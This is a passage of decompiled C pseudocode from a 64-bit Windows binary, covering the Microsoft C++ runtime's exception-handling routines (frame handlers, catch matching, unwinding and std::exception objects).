    return *(unsigned int *)(v3 + 8LL * (unsigned int)(v6 - 1) + v4 + 4);
  else
    return 0xFFFFFFFFLL;
}


// ----- sub_14001ED60 @ 0x14001ed60 -----
__int64 __fastcall sub_14001ED60(__int64 a1, __int64 *a2, int *a3, __int64 a4)
{
  __int64 v8; // rsi
  __int64 v9; // rsi
  __int64 v10; // rax
  unsigned int v11; // esi
  __int64 v12; // rax
  int v13; // ecx
  __int64 v14; // rax
  __int64 v15; // rcx
  __int64 v16; // rdx
  __int64 v17; // rbx
  __int64 v18; // rdx
  __int64 v19; // rax
  __int64 v20; // rbx
  __int64 v21; // rax
  __int64 v22; // rbx

  v8 = a3[1];
  if ( (_DWORD)v8 == 0 || v8 + sub_14001E890() == 0 )
    return 0;
  v9 = a3[1];
  if ( (_DWORD)v9 != 0 )
  {
    v10 = v9 + sub_14001E890();
    v11 = 0;
  }
  else
  {
    v11 = 0;
    v10 = 0;
  }
  if ( *(_BYTE *)(v10 + 16) == 0 )
    return 0;
  v12 = a3[2];
  if ( (_DWORD)v12 == 0 && *a3 >= 0 )
    return 0;
  v13 = *a3;
  if ( *a3 >= 0 )
    a2 = (__int64 *)(*a2 + v12);
  if ( (v13 & 0x80u) != 0 && (*(_BYTE *)a4 & 0x10) != 0 && qword_1400277E8 != nullptr )
  {
    v14 = qword_1400277E8();
    if ( v14 == 0 || a2 == nullptr )
      sub_14001B2E4();
    *a2 = v14;
    *a2 = sub_14001E1C0(v14, (int *)(a4 + 8));
  }
  else if ( (v13 & 8) != 0 )
  {
    v15 = *(_QWORD *)(a1 + 40);
    if ( v15 == 0 || a2 == nullptr )
      sub_14001B2E4();
    *a2 = v15;
    *a2 = sub_14001E1C0(v15, (int *)(a4 + 8));
  }
  else if ( (*(_BYTE *)a4 & 1) != 0 )
  {
    v16 = *(_QWORD *)(a1 + 40);
    if ( v16 == 0 || a2 == nullptr )
      sub_14001B2E4();
    sub_140022A10(a2, v16, *(int *)(a4 + 20));
    if ( *(_DWORD *)(a4 + 20) == 8 && *a2 != 0 )
      *a2 = sub_14001E1C0(*a2, (int *)(a4 + 8));
  }
  else
  {
    v17 = *(int *)(a4 + 24);
    if ( (_DWORD)v17 != 0 )
      v18 = sub_14001E8B0() + v17;
    else
      v18 = 0;
    v19 = *(_QWORD *)(a1 + 40);
    if ( v18 != 0 )
    {
      if ( v19 == 0 || a2 == nullptr || (_DWORD)(v22 = *(int *)(a4 + 24)) == 0 || v22 + sub_14001E8B0() == 0 )
        sub_14001B2E4();
      LOBYTE(v11) = (*(_BYTE *)a4 & 4) != 0;
      ++v11;
    }
    else
    {
      if ( v19 == 0 || a2 == nullptr )
        sub_14001B2E4();
      v20 = *(int *)(a4 + 20);
      v21 = sub_14001E1C0(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
      sub_140022A10(a2, v21, v20);
    }
  }
  return v11;
}


// ----- sub_14001EF40 @ 0x14001ef40 -----
__int64 __fastcall sub_14001EF40(__int64 a1, __int64 *a2, int *a3, __int64 a4)
{
  __int64 *v6; // rbx
  __int64 result; // rax
  __int64 v8; // rsi
  __int64 v9; // rdi
  __int64 v10; // rax
  __int64 v11; // rsi
  __int64 v12; // rdi
  __int64 v13; // rax

  if ( *a3 >= 0 )
    v6 = (__int64 *)(*a2 + a3[2]);
  else
    v6 = a2;
  result = (unsigned int)sub_14001ED60(a1, a2, a3, a4) - 1;
  if ( (_DWORD)result != 0 )
  {
    if ( (_DWORD)result == 1 )
    {
      v8 = sub_14001E1C0(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
      v9 = *(int *)(a4 + 24);
      if ( (_DWORD)v9 != 0 )
        v10 = v9 + sub_14001E8B0();
      else
        v10 = 0;
      return sub_1400202E0(v6, v10, v8, 1);
    }
  }
  else
  {
    v11 = sub_14001E1C0(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
    v12 = *(int *)(a4 + 24);
    if ( (_DWORD)v12 != 0 )
      v13 = v12 + sub_14001E8B0();
    else
      v13 = 0;
    return sub_1400202D0(v6, v13, v11);
  }
  return result;
}


// ----- sub_14001F000 @ 0x14001f000 -----
_DWORD *__fastcall sub_14001F000(
        ULONG_PTR a1,
        void **a2,
        ULONG_PTR a3,
        ULONG64 *a4,
        ULONG_PTR a5,
        unsigned __int8 a6,
        int a7,
        __int64 a8)
{
  void **v8; // r12
  ULONG64 *v10; // r14
  ULONG_PTR v11; // rsi
  int v12; // ebx
  _DWORD *result; // rax
  __int64 v14; // rbx
  unsigned int v15; // r8d
  _QWORD *v16; // r9
  __int64 v17; // rax
  __int64 v18; // rcx
  ULONG64 v19; // r13
  __int64 v20; // r14
  int v21; // r12d
  int *v22; // rsi
  int v23; // ebx
  __int64 v24; // rdi
  __int64 v25; // rdi
  __int64 v26; // rbx
  __int64 *v27; // rax
  ULONG_PTR v28; // rsi
  __int64 v29; // rbx
  __int64 v30; // rax
  __int64 v31; // rbx
  __int64 v32; // rdx
  _QWORD *v33; // rax
  int v34; // [rsp+60h] [rbp-D8h]
  unsigned int i; // [rsp+64h] [rbp-D4h]
  ULONG_PTR v36; // [rsp+68h] [rbp-D0h]
  _QWORD *v37; // [rsp+70h] [rbp-C8h] BYREF
  int v38; // [rsp+78h] [rbp-C0h]
  int v39; // [rsp+7Ch] [rbp-BCh]
  ULONG64 *v40; // [rsp+80h] [rbp-B8h]
  void **v41; // [rsp+88h] [rbp-B0h]
  __int64 v42; // [rsp+90h] [rbp-A8h] BYREF
  _QWORD v43[2]; // [rsp+98h] [rbp-A0h] BYREF
  __int64 v44; // [rsp+A8h] [rbp-90h] BYREF
  unsigned int v45; // [rsp+B0h] [rbp-88h]
  unsigned int v46; // [rsp+C0h] [rbp-78h]
  __int128 v47; // [rsp+C8h] [rbp-70h] BYREF
  int v48; // [rsp+D8h] [rbp-60h]

  v8 = a2;
  v41 = a2;
  v40 = a4;
  v10 = a4;
  v36 = a3;
  LODWORD(v11) = a3;
  v34 = sub_14001EC80(a5, a4);
  v12 = v34;
  sub_14001E460(v8, v10, a5, &v37);
  if ( v34 <= (int)sub_14001EC00(v8, v10, a5) )
  {
    v12 = sub_14001EC00(v8, v10, a5);
    v34 = v12;
  }
  else
  {
    sub_14001EC30((__int64 *)&v37, (__int64)v10, a5, v34);
    sub_14001EC40(v8, v10, a5, v34);
  }
  if ( v12 < -1 || v12 >= *(_DWORD *)(a5 + 4) )
    goto LABEL_58;
  if ( *(_DWORD *)a1 == -529697949
    && *(_DWORD *)(a1 + 24) == 4
    && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2
    && *(_QWORD *)(a1 + 48) == 0 )
  {
    result = sub_14001EA90();
    if ( *((_QWORD *)result + 4) == 0 )
      return result;
    a1 = *((_QWORD *)sub_14001EA90() + 4);
    v11 = *((_QWORD *)sub_14001EA90() + 5);
    v36 = v11;
    sub_14001E8F0(*(_QWORD *)(a1 + 56));
    if ( a1 == 0
      || *(_DWORD *)a1 == -529697949
      && *(_DWORD *)(a1 + 24) == 4
      && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2
      && *(_QWORD *)(a1 + 48) == 0 )
    {
      goto LABEL_58;
    }
    if ( *((_QWORD *)sub_14001EA90() + 7) != 0 )
    {
      v14 = *((_QWORD *)sub_14001EA90() + 7);
      *((_QWORD *)sub_14001EA90() + 7) = 0;
      if ( (unsigned __int8)sub_140020120(a1, v14) == 0 )
      {
        if ( (unsigned __int8)sub_140020240(v14) != 0 )
        {
          sub_14001E100(a1);
          sub_14001FBE0(&v47);
          sub_1400204A0(&v47, &_TI2_AVbad_exception_std__);
          __debugbreak();
        }
        sub_14001D9E8();
      }
      v12 = v34;
    }
  }
  v43[1] = v10[1];
  v43[0] = a5;
  if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) == 4 && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )
  {
    if ( *(_DWORD *)(a5 + 12) != 0 )
    {
      sub_14001E570((__int64)&v44, (__int64)v43, v12, (__int64)v10, a5);
      v15 = v45;
      v16 = (_QWORD *)v44;
      v37 = (_QWORD *)v44;
      for ( i = v45; v15 < v46; i = v15 )
      {
        v17 = *(int *)(*v16 + 16LL) + 20LL * v15;
        v18 = v16[1];
        v39 = *(_DWORD *)(v18 + v17);
        if ( v39 <= v12 && v12 <= *(_DWORD *)(v18 + v17 + 4) )
        {
          v19 = v10[1] + *(int *)(v18 + v17 + 16);
          v20 = 0;
          v21 = *(_DWORD *)(v18 + v17 + 12);
          v38 = *(_DWORD *)(v18 + v17 + 8);
          if ( v21 != 0 )
          {
            while ( 1 )
            {
              v47 = *(_OWORD *)(v19 + 20 * v20);
              v48 = *(_DWORD *)(v19 + 20 * v20 + 16);
              v22 = (int *)(sub_14001E8B0() + 4 + *(int *)(*(_QWORD *)(a1 + 48) + 12LL));
              v23 = *(_DWORD *)(*(int *)(*(_QWORD *)(a1 + 48) + 12LL) + sub_14001E8B0());
              if ( v23 > 0 )
                break;
LABEL_32:
              v20 = (unsigned int)(v20 + 1);
              if ( (_DWORD)v20 == v21 )
              {
                v15 = i;
                v12 = v34;
                v16 = v37;
                goto LABEL_34;
              }
            }
            while ( 1 )
            {
              v24 = *v22;
              v25 = sub_14001E8B0() + v24;
              if ( (unsigned int)sub_14001F830(&v47, v25, *(_QWORD *)(a1 + 48)) != 0 )
                break;
              --v23;
              ++v22;
              if ( v23 <= 0 )
                goto LABEL_32;
            }
            v10 = v40;
            v8 = v41;
            v27 = sub_14001E460(v41, v40, a5, &v42);
            v28 = (ULONG_PTR)v27;
            if ( v25 != 0 )
              sub_14001EF40(a1, v27, (int *)&v47, v25);
            v29 = SHIDWORD(v47);
            v30 = sub_14001E890();
            sub_14001E6C0(v8, a1, v36, v28, v29 + v30, a5, v39, v38, (int)&v47, (__int64)v10, a6);
            v15 = i;
            v16 = v37;
            v12 = v34;
          }
          else
          {
LABEL_34:
            v8 = v41;
            v10 = v40;
          }
        }
        ++v15;
      }
    }
    if ( (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930521
      && ((_DWORD)(v26 = *(int *)(a5 + 32)) != 0 && v26 + sub_14001E890() != 0
       || (*(_BYTE *)(a5 + 36) & 4) != 0 && !sub_14001E2C0((__int64)v10, a5)) )
    {
      if ( (*(_BYTE *)(a5 + 36) & 4) != 0 )
      {
        *((_QWORD *)sub_14001EA90() + 4) = a1;
        *((_QWORD *)sub_14001EA90() + 5) = v36;
        sub_14001D9E8();
      }
      v31 = *(int *)(a5 + 32);
      if ( (_DWORD)v31 != 0 )
        v32 = v31 + sub_14001E890();
      else
        v32 = 0;
      if ( (unsigned __int8)sub_140020120(a1, v32) == 0 )
      {
        v33 = sub_14001E460(v8, v10, a5, &v42);
        sub_14001E6C0(v8, a1, v36, (ULONG_PTR)v33, 0, a5, -1, -1, 0, (__int64)v10, a6);
      }
    }
  }
  else if ( *(_DWORD *)(a5 + 12) != 0 )
  {
    if ( a6 != 0 )
      goto LABEL_58;
    sub_14001F5B0(a1, (_DWORD)v8, v11, (_DWORD)v10, a5, v12, a7, a8);
  }
  result = sub_14001EA90();
  if ( *((_QWORD *)result + 7) != 0 )
LABEL_58:
    sub_14001B2E4();
  return result;
}


// ----- sub_14001F5B0 @ 0x14001f5b0 -----
void __fastcall sub_14001F5B0(unsigned int *a1, void **a2, ULONG_PTR a3, ULONG64 *a4, ULONG_PTR a5, int a6)
{
  __int64 v10; // rbx
  ULONG64 v11; // rax
  _QWORD *v12; // r9
  unsigned int v13; // edi
  __int64 v14; // rax
  __int64 v15; // r8
  int v16; // r12d
  __int64 v17; // rbp
  __int64 v18; // rsi
  __int64 v19; // rbx
  __int64 v20; // rbx
  __int64 v21; // rax
  _QWORD *v22; // rbx
  __int64 v23; // rax
  int v24; // [rsp+60h] [rbp-88h]
  _QWORD *i; // [rsp+68h] [rbp-80h]
  __int64 v26; // [rsp+70h] [rbp-78h] BYREF
  _QWORD v27[2]; // [rsp+78h] [rbp-70h] BYREF
  _QWORD *v28; // [rsp+88h] [rbp-60h] BYREF
  unsigned int v29; // [rsp+90h] [rbp-58h]
  unsigned int v30; // [rsp+A0h] [rbp-48h]

  if ( *a1 != -2147483645
    && (*((_QWORD *)sub_14001EA90() + 2) == 0
     || (PVOID)(v10 = *((_QWORD *)sub_14001EA90() + 2)) == EncodePointer(nullptr)
     || *a1 == -532459699
     || *a1 == -532462766
     || (unsigned int)sub_14001E270(a1, (__int64)a2, a3) == 0) )
  {
    v11 = a4[1];
    v27[0] = a5;
    v27[1] = v11;
    if ( *(_DWORD *)(a5 + 12) == 0 )
      sub_14001B2E4();
    sub_14001E570((__int64)&v28, (__int64)v27, a6, (__int64)a4, a5);
    v12 = v28;
    v13 = v29;
    for ( i = v28; v13 < v30; ++v13 )
    {
      v14 = v12[1];
      v15 = *(int *)(*v12 + 16LL) + 20LL * v13;
      v16 = *(_DWORD *)(v14 + v15);
      if ( v16 <= a6 && a6 <= *(_DWORD *)(v14 + v15 + 4) )
      {
        if ( (v17 = *(int *)(v14 + v15 + 16),
              v24 = *(_DWORD *)(v14 + v15 + 8),
              v18 = a4[1] + 20LL * *(unsigned int *)(v14 + v15 + 12),
              (_DWORD)(v19 = *(int *)(v18 + v17 - 16)) == 0)
          || v19 + sub_14001E890() == 0
          || ((_DWORD)(v20 = *(int *)(v18 + v17 - 16)) == 0 ? (v21 = 0) : (v21 = v20 + sub_14001E890()),
              *(_BYTE *)(v21 + 16) == 0) )
        {
          if ( (*(_BYTE *)(v18 + v17 - 20) & 0x40) == 0 )
          {
            v22 = sub_14001E460(a2, a4, a5, &v26);
            v23 = sub_14001E890();
            sub_14001E6C0(
              a2,
              (ULONG_PTR)a1,
              a3,
              (ULONG_PTR)v22,
              v23 + *(int *)(v18 + v17 - 8),
              a5,
              v16,
              v24,
              v18 + v17 - 20,
              (__int64)a4,
              0);
          }
        }
      }
      v12 = i;
    }
  }
}


// ----- sub_14001F830 @ 0x14001f830 -----
_BOOL8 __fastcall sub_14001F830(__int64 a1, __int64 a2, int *a3)
{
  __int64 v3; // rbx
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // rsi
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rsi
  __int64 v13; // rbx
  __int64 v14; // r8
  unsigned __int8 *v15; // rax
  __int64 v16; // r8
  int v17; // ecx
  int v18; // edx
  int v20; // eax

  v3 = *(int *)(a1 + 4);
  if ( (_DWORD)v3 == 0 || v3 + sub_14001E890() == 0 )
    return true;
  v7 = *(int *)(a1 + 4);
  v8 = (_DWORD)v7 != 0 ? v7 + sub_14001E890() : 0LL;
  if ( *(_BYTE *)(v8 + 16) == 0 || *(char *)a1 < 0 && (*(_BYTE *)a2 & 0x10) != 0 )
    return true;
  v9 = *(int *)(a1 + 4);
  if ( (_DWORD)v9 != 0 )
    v10 = sub_14001E890() + v9;
  else
    v10 = 0;
  if ( v10 != *(int *)(a2 + 4) + sub_14001E8B0() )
  {
    v11 = *(int *)(a1 + 4);
    v12 = (_DWORD)v11 != 0 ? sub_14001E890() + v11 : 0LL;
    v13 = *(int *)(a2 + 4);
    v14 = sub_14001E8B0() + v13 + 16;
    v15 = (unsigned __int8 *)(v12 + 16);
    v16 = v14 - (v12 + 16);
    do
    {
      v17 = v15[v16];
      v18 = *v15 - v17;
      if ( v18 != 0 )
        break;
      ++v15;
    }
    while ( v17 != 0 );
    if ( v18 != 0 )
      return false;
  }
  if ( (*(_BYTE *)a2 & 2) != 0 && (*(_BYTE *)a1 & 8) == 0 )
    return false;
  v20 = *a3;
  if ( (*a3 & 1) != 0 && (*(_BYTE *)a1 & 1) == 0 )
    return false;
  return ((v20 & 4) == 0 || (*(_BYTE *)a1 & 4) != 0) && ((v20 & 2) == 0 || (*(_BYTE *)a1 & 2) != 0);
}


// ----- sub_14001F960 @ 0x14001f960 -----
__int64 __fastcall sub_14001F960(
        ULONG_PTR a1,
        __int64 *a2,
        ULONG_PTR a3,
        ULONG64 *a4,
        ULONG_PTR a5,
        int a6,
        __int64 a7,
        unsigned __int8 a8)
{
  int v12; // eax
  bool v13; // zf
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // r9d
  __int64 v18; // rbp
  __int64 v19; // rbp
  __int64 (__fastcall *v20)(ULONG_PTR, __int64 *, ULONG_PTR, ULONG64 *, ULONG_PTR, int, __int64, _DWORD); // rax

  sub_14001EA50();
  if ( sub_14001EA90()[16] != 0 )
    goto LABEL_10;
  v12 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 != -529697949 )
  {
    if ( v12 != -2147483607 )
    {
      v13 = v12 == -2147483610;
LABEL_7:
      if ( v13 )
        goto LABEL_10;
      goto LABEL_8;
    }
    if ( *(_DWORD *)(a1 + 24) == 15 )
    {
      v13 = *(_QWORD *)(a1 + 96) == 429065504;
      goto LABEL_7;
    }
LABEL_8:
    if ( (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (*(_BYTE *)(a5 + 36) & 1) != 0 )
      return 1;
  }
LABEL_10:
  v14 = *(_DWORD *)(a1 + 4);
  if ( (v14 & 0x66) != 0 )
  {
    v15 = *(_DWORD *)(a5 + 4);
    if ( v15 == 0 || a6 != 0 )
      return 1;
    if ( (v14 & 0x20) != 0 )
    {
      if ( *(_DWORD *)a1 == -2147483610 )
      {
        v16 = sub_14001ECF0(a5, (__int64)a4, a4[4]);
        if ( v16 >= -1 && v16 < *(_DWORD *)(a5 + 4) )
        {
          sub_14001FF60(a2, a4, a5);
          return 1;
        }
LABEL_37:
        sub_14001B2E4();
      }
      if ( *(_DWORD *)a1 == -2147483607 )
      {
        v17 = *(_DWORD *)(a1 + 56);
        if ( v17 >= -1 && v17 < v15 )
        {
          sub_14001FF60(*(_QWORD *)(a1 + 40), a4, a5);
          return 1;
        }
        goto LABEL_37;
      }
    }
    sub_14001E320(a2, a4, a5);
    return 1;
  }
  if ( *(_DWORD *)(a5 + 12) != 0
    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930521
    && (_DWORD)(v18 = *(int *)(a5 + 32)) != 0
    && v18 + sub_14001E890() != 0
    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (*(_BYTE *)(a5 + 36) & 4) != 0 )
  {
    if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) >= 3u && *(_DWORD *)(a1 + 32) > 0x19930522u )
    {
      v19 = *(int *)(*(_QWORD *)(a1 + 48) + 8LL);
      if ( (_DWORD)v19 != 0 )
      {
        v20 = (__int64 (__fastcall *)(ULONG_PTR, __int64 *, ULONG_PTR, ULONG64 *, ULONG_PTR, int, __int64, _DWORD))(v19 + sub_14001E8B0());
        if ( v20 != nullptr )
          return v20(a1, a2, a3, a4, a5, a6, a7, a8);
      }
    }
    sub_14001F000(a1, (void **)a2, a3, a4, a5, a8, a6, a7);
  }
  return 1;
}


// ----- sub_14001FB90 @ 0x14001fb90 -----
__int64 __fastcall sub_14001FB90(
        ULONG_PTR a1,
        __int64 *a2,
        ULONG_PTR a3,
        ULONG64 *a4,
        ULONG_PTR a5,
        int a6,
        __int64 a7,
        unsigned __int8 a8)
{
  return sub_14001F960(a1, a2, a3, a4, a5, a6, a7, a8);
}


// ----- sub_14001FBA0 @ 0x14001fba0 -----
__int64 __fastcall sub_14001FBA0(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_140020390(a2 + 8);
  *(_QWORD *)a1 = &std::bad_exception::`vftable';
  return a1;
}


// ----- sub_14001FBE0 @ 0x14001fbe0 -----
_QWORD *__fastcall sub_14001FBE0(_QWORD *a1)
{
  a1[2] = 0;
  a1[1] = "bad exception";
  *a1 = &std::bad_exception::`vftable';
  return a1;
}


// ----- sub_14001FC10 @ 0x14001fc10 -----
__int64 __fastcall sub_14001FC10(__int64 a1, __int64 a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_OWORD *)(a1 + 8) = 0;
  sub_140020390(a2 + 8);
  return a1;
}


// ----- sub_14001FC50 @ 0x14001fc50 -----
__int64 __fastcall sub_14001FC50(_QWORD *a1)
{
  *a1 = &std::exception::`vftable';
  return sub_140020430(a1 + 1);
}


// ----- sub_14001FC70 @ 0x14001fc70 -----
char *__fastcall sub_14001FC70(char *lpMem, char a2)
{
  *(_QWORD *)lpMem = &std::exception::`vftable';
  sub_140020430(lpMem + 8);
  if ( (a2 & 1) != 0 )
    sub_1400228F0(lpMem);
  return lpMem;
}


// ----- sub_14001FCC0 @ 0x14001fcc0 -----
__int64 __fastcall sub_14001FCC0(_QWORD *a1)
{
  __int64 v2; // r13
  __int64 v3; // rsi
  __int64 v4; // rbx
  _QWORD *v5; // r14
  _DWORD *v6; // rax
  _QWORD *v7; // r12
  __int64 v8; // rbx
  __int64 v10; // [rsp+38h] [rbp-90h]
  __int64 v11; // [rsp+40h] [rbp-88h]
  _QWORD v12[9]; // [rsp+80h] [rbp-48h] BYREF
  __int64 v13; // [rsp+E8h] [rbp+20h]

  v2 = *((_QWORD *)sub_14001EA90() + 5);
  v11 = *((_QWORD *)sub_14001EA90() + 4);
  v3 = a1[10];
  v13 = a1[9];
  v4 = a1[8];
  v10 = a1[6];
  v5 = (_QWORD *)a1[5];
  sub_14001EA50();
  *((_QWORD *)sub_14001EA90() + 4) = v3;
  *((_QWORD *)sub_14001EA90() + 5) = v4;
  v6 = sub_14001EA90();
  v7 = sub_14001E7F0(v12, *(_QWORD *)(*((_QWORD *)v6 + 4) + 40LL));
  if ( a1[11] != 0 )
    sub_14001EA90();
  v8 = sub_140020350(v10, v5, 256);
  sub_14001E830((__int64)v7);
  if ( *(_DWORD *)v3 == -529697949
    && *(_DWORD *)(v3 + 24) == 4
    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2
    && (unsigned int)sub_14001E180(*(_QWORD *)(v3 + 40)) != 0 )
  {
    sub_14001E100(v3);
  }
  *((_QWORD *)sub_14001EA90() + 4) = v11;
  *((_QWORD *)sub_14001EA90() + 5) = v2;
  *(_QWORD *)(*(int *)(v13 + 28) + *v5) = -2;
  return v8;
}


// ----- sub_14001FED0 @ 0x14001fed0 -----
__int64 __fastcall sub_14001FED0(__int64 *a1, __int64 a2, _DWORD *a3)
{
  __int64 v3; // r9

  v3 = *a1;
  *a3 = 0;
  if ( *(_DWORD *)v3 != -529697949 )
    return 0;
  if ( *(_DWORD *)(v3 + 24) == 4
    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2
    && *(_QWORD *)(v3 + 40) == *(_QWORD *)(a2 + 40) )
  {
    *a3 = 1;
  }
  if ( *(_DWORD *)v3 != -529697949
    || *(_DWORD *)(v3 + 24) != 4
    || (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) > 2
    || *(_QWORD *)(v3 + 48) != 0 )
  {
    return 0;
  }
  sub_14001EA90()[16] = 1;
  *a3 = 1;
  return 1;
}


// ----- sub_14001FF60 @ 0x14001ff60 -----
__int64 __fastcall sub_14001FF60(__int64 *a1, unsigned __int64 *a2, _DWORD *a3, int a4)
{
  __int64 v8; // r13
  int v9; // edi
  _DWORD *v10; // rax
  __int64 v11; // r14
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  __int64 v18; // rcx
  _DWORD *v19; // rax

  v8 = sub_14001E890();
  v9 = sub_14001EB70(a1, a2, a3);
  v10 = sub_14001EA90();
  ++v10[12];
  while ( v9 != -1 && v9 > a4 )
  {
    if ( v9 <= -1 || v9 >= a3[1] )
      sub_14001B2E4();
    v11 = 8LL * v9;
    v9 = *(_DWORD *)((int)a3[2] + sub_14001E890() + v11);
    v12 = (int)a3[2];
    if ( *(_DWORD *)(v12 + sub_14001E890() + v11 + 4) != 0 )
    {
      v13 = (int)a3[2];
      v14 = *(int *)(v13 + sub_14001E890() + v11 + 4);
      if ( v14 + sub_14001E890() != 0 )
      {
        sub_14001EC30(a1, (__int64)a2, (__int64)a3, v9);
        v15 = (int)a3[2];
        if ( *(_DWORD *)(v15 + sub_14001E890() + v11 + 4) != 0 )
        {
          v16 = (int)a3[2];
          v17 = *(int *)(v16 + sub_14001E890() + v11 + 4);
          v18 = v17 + sub_14001E890();
        }
        else
        {
          v18 = 0;
        }
        sub_140020350(v18, a1, 259);
        sub_14001E8D0(v8);
      }
    }
  }
  if ( (int)sub_14001EA90()[12] > 0 )
  {
    v19 = sub_14001EA90();
    --v19[12];
  }
  if ( v9 != -1 && v9 > a4 )
    sub_14001B2E4();
  return sub_14001EC30(a1, (__int64)a2, (__int64)a3, v9);
}


// ----- sub_140020120 @ 0x140020120 -----
__int64 __fastcall sub_140020120(__int64 a1, _DWORD *a2)
{
  unsigned __int8 v4; // di
  int v5; // r14d
  int *v6; // rbp
  int v7; // ebx
  __int64 v8; // rsi
  __int64 v9; // rax
  int *v10; // rdi
  __int64 v11; // rsi
  __int64 v12; // rax
  char i; // [rsp+58h] [rbp+10h]

  if ( a2 == nullptr )
    sub_14001B2E4();
  v4 = 0;
  v5 = 0;
  for ( i = 0; v5 < *a2; ++v5 )
  {
    v6 = (int *)(sub_14001E8B0() + *(int *)(*(_QWORD *)(a1 + 48) + 12LL) + 4LL);
    v7 = *(_DWORD *)(*(int *)(*(_QWORD *)(a1 + 48) + 12LL) + sub_14001E8B0());
    if ( v7 > 0 )
    {
      while ( 1 )
      {
        v8 = *v6;
        v9 = sub_14001E8B0();
        v10 = *(int **)(a1 + 48);
        v11 = v9 + v8;
        v12 = sub_14001E890();
        if ( sub_14001F830(20LL * v5 + (int)a2[1] + v12, v11, v10) )
          break;
        --v7;
        ++v6;
        if ( v7 <= 0 )
        {
          v4 = i;
          goto LABEL_8;
        }
      }
      v4 = 1;
      i = 1;
    }
LABEL_8:
    ;
  }
  return v4;
}


// ----- sub_140020240 @ 0x140020240 -----
char __fastcall sub_140020240(int *a1)
{
  int v1; // ebx
  __int64 v3; // rdi
  __int64 v4; // rcx

  v1 = 0;
  if ( *a1 <= 0 )
    return 0;
  while ( 1 )
  {
    if ( *(_DWORD *)(a1[1] + sub_14001E890() + 20LL * v1 + 4) != 0 )
    {
      v3 = *(int *)(a1[1] + sub_14001E890() + 20LL * v1 + 4);
      v4 = v3 + sub_14001E890();
    }
    else
    {
      v4 = 0;
    }
    if ( (unsigned int)sub_140020470(v4 + 8, &qword_140027048) == 0 )
      break;
    if ( ++v1 >= *a1 )
      return 0;
  }
  return 1;
}


// ----- sub_1400202D0 @ 0x1400202d0 -----
__int64 __fastcall sub_1400202D0(__int64 a1, __int64 (__fastcall *a2)(__int64, __int64), __int64 a3)
{
  return a2(a1, a3);
}


// ----- sub_1400202E0 @ 0x1400202e0 -----
__int64 __fastcall sub_1400202E0(
        __int64 a1,
        __int64 (__fastcall *a2)(__int64, __int64, _QWORD),
        __int64 a3,
        unsigned int a4)
{
  return a2(a1, a3, a4);
}


// ----- sub_1400202F0 @ 0x1400202f0 -----
const char *__fastcall sub_1400202F0(__int64 a1)
{
  const char *result; // rax

  result = "Unknown exception";
  if ( *(_QWORD *)(a1 + 8) != 0 )
    return *(const char **)(a1 + 8);
  return result;
}


// ----- sub_140020350 @ 0x140020350 -----
void sub_140020350()
{
  void (*v0)(void); // rax

  sub_14001EA10();
  v0();
  nullsub_2();
  sub_14001EA10();
}


// ----- sub_140020390 @ 0x140020390 -----
__int64 __fastcall sub_140020390(__int64 *a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v6; // rbp
  LPVOID v7; // rax
  LPVOID v8; // rsi
  __int64 result; // rax

  if ( *((_BYTE *)a1 + 8) != 0 && *a1 != 0 )
  {
    v4 = -1;
    while ( *(_BYTE *)(*a1 + v4++ + 1) != 0 )
      ;
    v6 = v4 + 1;
    v7 = sub_140020580(v4 + 1);
    v8 = v7;
    if ( v7 != nullptr )
    {
      sub_140020590(v7, v6, *a1);
      *(_QWORD *)a2 = v8;
      *(_BYTE *)(a2 + 8) = 1;
    }
    return sub_140020570(nullptr);
  }
  else
  {
    result = *a1;
    *(_QWORD *)a2 = *a1;
    *(_BYTE *)(a2 + 8) = 0;
  }
  return result;
}


// ----- sub_140020430 @ 0x140020430 -----
__int64 __fastcall sub_140020430(__int64 a1)
{
  __int64 result; // rax

  if ( *(_BYTE *)(a1 + 8) != 0 )
  {
    result = sub_140020570(*(LPVOID *)a1);
    *(_BYTE *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0;
  }
  else
  {
    *(_BYTE *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0;
  }
  return result;
}


// ----- sub_140020470 @ 0x140020470 -----
__int64 __fastcall sub_140020470(__int64 a1, __int64 a2)
{
  unsigned __int8 *v2; // rax
  __int64 v3; // rdx
  unsigned __int8 v4; // cl

  if ( a1 == a2 )
    return 0;
  v2 = (unsigned __int8 *)(a1 + 9);
  v3 = a2 - a1;
  while ( 1 )
  {
    v4 = *v2;
    if ( *v2 != v2[v3] )
      break;
    ++v2;
    if ( v4 == 0 )
      return 0;
  }
  return v4 < v2[v3] ? -1 : 1;
}


// ----- sub_1400204A0 @ 0x1400204a0 -----
void __fastcall sub_1400204A0(_QWORD *a1, _BYTE *a2)
{
  _BYTE *v2; // rbx
  ULONG_PTR v4; // rdi
  __int64 v5; // rcx
  PVOID v6; // rax
  PVOID BaseOfImage; // [rsp+20h] [rbp-38h] BYREF
  ULONG_PTR Arguments[6]; // [rsp+28h] [rbp-30h] BYREF

  v2 = a2;
  v4 = 429065504;
  if ( a2 != nullptr )
  {
    if ( (*a2 & 0x10) != 0 )
